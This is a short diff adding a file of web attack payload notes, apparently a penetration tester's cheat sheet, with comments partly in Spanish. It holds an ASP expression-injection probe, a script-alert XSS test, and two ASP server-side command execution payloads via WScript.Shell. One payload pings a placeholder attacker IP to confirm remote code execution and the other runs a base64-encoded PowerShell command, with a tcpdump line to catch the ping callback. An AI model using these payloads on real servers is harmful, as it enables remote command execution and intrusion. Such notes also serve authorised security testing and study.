@@ -1,0 +1,13 @@
+
+
+<%response.write(8*8) %>						"XSS"
+
+	<script>alert("XSS")</script>			"XSS"
+
+
+
+<%response.write CreateObject("WScript.Shell").Exec("cmd /c ping -n 8 myIpHere").StdOut..Readall() %>
+
+<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand comandBase64Here").StdOut..Readall() %>
+
+			:: sudo tcpdump -i tun0 icmp -n				"validar si llega en ping RCE... <3 <3 <3"
